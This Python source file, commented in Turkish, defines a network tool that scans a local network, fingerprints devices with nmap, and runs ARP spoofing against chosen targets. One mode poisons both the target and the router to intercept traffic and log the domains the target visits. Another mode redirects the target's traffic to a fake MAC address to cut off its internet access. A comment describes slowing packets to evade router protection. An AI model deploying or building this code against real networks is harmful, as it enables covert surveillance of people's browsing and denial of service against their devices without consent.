import json
import os
import threading
import time
import socket
import nmap  # pip install python-nmap ile yüklediğin kütüphane
from scapy.all import ARP, Ether, srp, send, sniff, IP, get_if_addr, conf, DNS, DNSQR, send
from mac_vendor_lookup import MacLookup

class NetworkManager:
    def __init__(self):
        self.is_running = False # Genel çalışma durumu
        self.is_spoofing = False
        self.db_path = "known_devices.json"
        self.nm_scanner = nmap.PortScanner() # Nmap tarayıcısını başlat
        self.vendor_lookup = MacLookup()
        self.log_callback = None
        self.is_monitoring = False # Yeni: Takip modu için
        self.target_ip = None
        try:
            self.vendor_lookup.update_vendors() 
        except:
            pass

    def _arp_loop(self, target_ip, gateway_ip, target_mac, delay):
        """Genel ARP döngüsü. delay parametresi hızı belirler."""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        
        while self.is_running:
            send(packet, verbose=False)
            time.sleep(delay) # Burası artık dinamik!
    
    def packet_callback(self, packet):
        """Hafifletilmiş ve daha hassas paket analizi."""
        if not self.is_monitoring or not self.log_callback:
            return

        # SADECE DNS (UDP 53) SORGULARINA ODAKLAN
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            try:
                # DNS Sorgu kaydını al
                qname = packet.getlayer(DNSQR).qname.decode('utf-8')
                domain = qname.strip('.')
                
                # Gereksiz sistem/reklam sorgularını filtrele (Logu temiz tutar)
                ignored_domains = ["google-analytics", "metrics", "gvt1", "apple-cloud", "msftncsi"]
                if not any(x in domain for x in ignored_domains):
                    self.log_callback(f"🌐 Ziyaret: {domain}")
            except:
                pass

    def run_sniff(self):
        """Sadece ilgili IP'nin DNS paketlerine odaklanır."""
        # Port 53 DNS trafiğidir.
        sniff_filter = f"udp port 53 and src host {self.target_ip}"
        sniff(filter=sniff_filter, prn=self.packet_callback, store=0, iface=conf.iface, 
              stop_filter=lambda x: not self.is_monitoring)

    def start_monitoring(self, target_ip, gateway_ip, target_mac, log_cb):
        """TAKİP MODU."""
        self.stop_all() # Önce çalışan her şeyi durdur
        self.is_running = True
        self.is_monitoring = True
        self.target_ip = target_ip
        self.log_callback = log_cb
        
        # Sadece hedefin paketlerini bize yönlendirelim,
        # modemin paketlerini hedefe yönlendirirsek (çift taraflı spoofing yapmazsak) asimetrik routing yüzünden internet yavaşlar/kopar.
        # Bu yüzden çift taraflı (hem hedefi hem modemi kandıran) bir spoofing döngüsü kurmalıyız ki aracı olabilelim.
        threading.Thread(target=self._full_arp_loop, 
                         args=(target_ip, target_mac, gateway_ip, 2), 
                         daemon=True).start()

        # DNS Takibi için sniff başlat
        threading.Thread(target=self.run_sniff, daemon=True).start()

    def _full_arp_loop(self, target_ip, target_mac, gateway_ip, delay):
        """Tam ARP döngüsü. Hem hedefi hem modemi kandırır ki trafik içimizden aksın."""
        my_mac = Ether().src # Scapy otomatik kendi MAC imizi bulur
        try:
            # Modemin MAC adresini bulalım
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), timeout=2, verbose=False)
            gateway_mac = ans[0][1].hwsrc
        except Exception:
            # Bulunamazsa döngüye girme
            return

        # Hedefe giden paket (Ben modemim)
        packet_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        # Modeme giden paket (Ben hedefim)
        packet_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        while self.is_running:
            send(packet_target, verbose=False)
            send(packet_gateway, verbose=False)
            time.sleep(delay)

    def sniff_traffic(self):
        """Trafiği daha geniş bir filtreyle dinle."""
        # Sadece DNS değil, hedeften gelen her türlü IP paketini yakalayalım (Test için)
        sniff_filter = f"ip src {self.target_ip}" 
        
        print(f"Dinleme başladı: {self.target_ip} üzerinden...")
        
        sniff(filter=sniff_filter, 
            prn=self.packet_callback, 
            iface=conf.iface, # Aktif arayüzü zorla kullan
            store=0, 
            stop_filter=lambda x: not self.is_monitoring) 
        
    def stop_monitoring(self):
        self.is_running = False
        self.is_monitoring = False

    def get_custom_name(self, mac):
        """JSON dosyasından ismi güvenli bir şekilde okur."""
        if not os.path.exists(self.db_path):
            return None
        
        try:
            with open(self.db_path, "r", encoding="utf-8") as f:
                content = f.read()
                if not content: # Dosya boşsa
                    return None
                db = json.loads(content)
                return db.get(mac)
        except (json.JSONDecodeError, Exception):
            return None
    
    def save_custom_name(self, mac, name):
        """İsmi kaydederken dosyayı her zaman geçerli bir JSON formatında tutar."""
        db = {}
        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    if content:
                        db = json.loads(content)
            except json.JSONDecodeError:
                db = {}

        db[mac] = name
        with open(self.db_path, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=4)

    def get_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            return None

    def get_vendor(self, mac):
        try:
            return self.vendor_lookup.lookup(mac)
        except:
            return "Bilinmeyen Marka"

    def get_os_info(self, ip):
        """Nmap kullanarak cihazın işletim sistemini tahmin eder."""
        try:
            # -O: İşletim sistemi tespiti, -F: Hızlı tarama
            # Bu işlem birkaç saniye sürebilir
            scan_result = self.nm_scanner.scan(ip, arguments='-O -F --host-timeout 5s')
            if 'osmatch' in scan_result['scan'][ip] and scan_result['scan'][ip]['osmatch']:
                return scan_result['scan'][ip]['osmatch'][0]['name']
        except:
            pass
        return "İşletim Sistemi Belirlenemedi"

    def scan_network(self, ip_range):
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=False)[0]
        devices = []
        
        for sent, received in result:
            # 1. ADIM: Önce veriyi Scapy'den al (mac burada tanımlanıyor)
            ip = received.psrc
            mac = received.hwsrc
            
            # 2. ADIM: Şimdi mac değişkenini kullanabiliriz
            custom_name = self.get_custom_name(mac)
            
            if custom_name:
                name = custom_name
            else:
                # 3. ADIM: Eğer özel isim yoksa diğer sorguları yap
                name = self.get_hostname(ip)
                if not name or name == ip:
                    os_guess = self.get_os_info(ip)
                    if os_guess and "Belirlenemedi" not in os_guess:
                        name = f"OS: {os_guess}"
                    else:
                        name = f"Marka: {self.get_vendor(mac)}"
            
            devices.append({'ip': ip, 'mac': mac, 'name': name})
        
        return devices
    
    def spoof_packet_callback(self, packet):
        """Hedef cihazdan gelen her paketi yakalar ve GUI'ye bildirir."""
        if getattr(self, 'is_spoofing', False) and self.log_callback:
            # Eğer paket gelen IP, hedef IP ile eşleşiyorsa
            if packet.haslayer(IP) and packet[IP].src == self.target_ip:
                self.log_callback(f"⚠️ Engellenen Cihaz ({self.target_ip}) veri göndermeye çalışıyor!")

    def start_sniffing(self):
        """Ayrı bir thread'de paket dinlemeyi başlatır."""
        # Sadece hedef IP'den gelen paketleri filtrele (Performans için)
        sniff(filter=f"host {self.target_ip}", prn=self.spoof_packet_callback, stop_filter=lambda x: not self.is_spoofing)

    def get_my_ip(self):
        """Bilgisayarın o anki aktif ağ arayüzündeki IP'sini bulur."""
        try:
            return get_if_addr(conf.iface)
        except:
            # Alternatif yöntem: Eğer scapy bulamazsa standart socket kullan
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip

    def safe_spoof(self, target_ip, gateway_ip, target_mac):
        my_ip = self.get_my_ip()
        
        # Kendi IP'mizi kazara hedef almayalım
        if target_ip == my_ip:
            print("Hata: Kendi IP'nizi engelleyemezsiniz!")
            return

        # SADECE HEDEFE PAKET GÖNDER (Modeme dokunma)
        # Bu paket: "Ben modemim (gateway_ip), paketleri bana (benim MAC adresime) at" der.
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        
        while self.is_spoofing:
            send(packet, verbose=False)
            # Sıklığı düşürelim (Router'ın koruma sistemine takılmamak için)
            time.sleep(3)

    def start_disconnect(self, target_ip, gateway_ip, target_mac, log_cb):
        """KESME MODU: Trafiği geçersiz bir MAC adresine yönlendirerek bloke eder."""
        self.stop_all() # Önce çalışan her şeyi durdur
        self.is_running = True
        self.target_ip = target_ip
        self.log_callback = log_cb
        
        # İnterneti tam anlamıyla koparmak için sahte MAC döngüsünü başlat
        threading.Thread(target=self._block_arp_loop, args=(target_ip, gateway_ip, target_mac), daemon=True).start()
        
        # Kesme modunda da veri denemelerini izlemek için sniff başlatabilirsin
        threading.Thread(target=self.run_sniff, daemon=True).start()

    def _block_arp_loop(self, target_ip, gateway_ip, target_mac):
        """Hedef cihazın paketlerini sahte bir MAC adresine (Kara Delik) yollar."""
        fake_mac = "02:00:00:00:00:00"
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=fake_mac)
        
        while self.is_running:
            send(packet, verbose=False)
            time.sleep(1)


    def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Ağı eski haline döndürür (Düzeltme paketleri gönderir)."""
        # op=2, psrc=kaynak ip, hwsrc=kaynak mac, pdst=hedef ip, hwdst=hedef mac
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(packet, count=4, verbose=False)
        
        packet_rev = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        send(packet_rev, count=4, verbose=False)


    def stop_disconnect(self):
        self.is_running = False


    def stop_all(self):
        """Tüm işlemleri güvenli bir şekilde durdurur."""
        self.is_running = False
        self.is_monitoring = False
        self.is_spoofing = False
        time.sleep(0.2) # Thread'lerin kapanması için kısa bir süre bekle